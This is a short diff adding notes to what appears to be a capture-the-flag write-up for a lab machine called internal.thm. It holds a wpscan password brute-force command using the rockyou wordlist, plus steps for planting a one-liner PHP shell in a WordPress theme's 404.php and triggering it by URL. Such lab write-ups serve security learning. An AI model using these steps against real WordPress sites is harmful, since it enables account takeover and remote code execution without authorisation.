@@ -56,6 +56,20 @@ To get the reverse shell.
 
 
 
+Wordpress Password BruteForce:
+
+wpscan --url http://internal.thm/blog -e u --passwords /usr/share/wordlists/rockyou.txt
+
+Wordpress RCE:
+In the Apperance===> Themes Editor , In the 404.php, Template replace with one liner php shell. 
+To execute it:
+http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
+
+You can get the naem twentyseventeen in the name of the template. 
+
+
+
+
 
 
 
